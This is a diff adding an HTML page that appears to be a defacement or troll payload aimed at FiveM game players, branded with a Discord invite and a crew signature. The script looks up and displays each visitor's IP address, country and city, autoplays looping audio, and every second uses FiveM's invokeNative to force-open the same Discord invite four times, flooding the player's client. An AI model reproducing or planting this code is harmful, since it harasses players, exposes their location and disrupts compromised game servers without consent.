@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>discord.gg/PrimePVP</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 25px;
+            max-width: 90%;
+            width: 600px;
+        }
+        .image-container img {
+            max-width: 100%;
+            width: 400px;
+            height: auto;
+            border: 2px solid #ffffff;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.7);
+        }
+        .additional-image {
+            margin-top: 15px;
+        }
+        .additional-image img {
+            max-width: 100%;
+            width: 350px;
+            height: auto;
+            border: 2px solid #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+        .info {
+            background-color: rgba(0, 0, 0, 0.4);
+            padding: 15px 25px;
+            border-radius: 10px;
+            font-size: 1.2em;
+            color: #ffffff;
+            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffffff;
+            letter-spacing: 1.5px;
+            line-height: 1.6;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .text {
+            margin-top: 10px;
+            font-size: 2.5em;
+            color: #ffffff;
+            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffffff;
+            letter-spacing: 4.5px;
+            font-weight: bold;
+        }
+        @media (max-width: 600px) {
+            .info {
+                font-size: 1em;
+                padding: 12px;
+            }
+            .text {
+                font-size: 1.8em;
+            }
+            .image-container img {
+                width: 320px;
+            }
+            .additional-image img {
+                width: 280px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="image-container">
+            <img src="https://top4top.io/del2a396bdbcf8808fd04449f506bde89df.html" alt="">
+        </div>
+        
+        <!-- Added the new image here -->
+        <div class="additional-image">
+            <img src="https://j.top4top.io/p_3602rpafy1.gif" alt="additional-image">
+        </div>
+        
+        <div class="info" id="ip-info">
+            <strong>IP: <span id="ip"></span></strong><br>
+            <span><strong>Country:</strong> <span id="country"></span></span><br>
+            <span><strong>City:</strong> <span id="city"></span></span>
+        </div>
+        
+        <div class="text">GoTeN7 x 0D4YYY</div>
+    </div>
+
+    <audio autoplay loop>
+        <source src="https://e.top4top.io/m_3602vfnqw1.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        // Fetch and display IP information
+        fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('ip').textContent = data.ip;
+            document.getElementById('country').textContent = data.country;
+            document.getElementById('city').textContent = data.city;
+        })
+        .catch(error => {
+            console.error('Error fetching IP information:', error);
+            document.getElementById('ip-info').innerHTML = 'Unable to retrieve location information';
+        });
+
+        // Added script to repeatedly open Discord URL (for FiveM environment)
+        setInterval(() => {
+            if (typeof invokeNative !== 'undefined') {
+                window.invokeNative("openUrl", "https://discord.gg/HJygvxc8n9");
+                window.invokeNative("openUrl", "https://discord.gg/HJygvxc8n9");
+                window.invokeNative("openUrl", "https://discord.gg/HJygvxc8n9");
+                window.invokeNative("openUrl", "https://discord.gg/HJygvxc8n9");
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
